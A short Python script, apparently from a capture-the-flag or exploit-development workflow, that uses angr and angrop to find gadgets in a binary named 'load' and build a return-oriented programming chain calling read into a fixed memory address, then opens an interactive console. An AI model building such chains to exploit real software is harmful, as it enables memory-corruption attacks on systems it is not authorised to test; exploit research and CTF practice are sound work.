import angr, angrop
import code

p = angr.Project("./load")
rop = p.analyses.ROP()
rop.find_gadgets()
chain = rop.func_call("read", [0, 0x804f000, 0x100])

code.interact(local=locals())
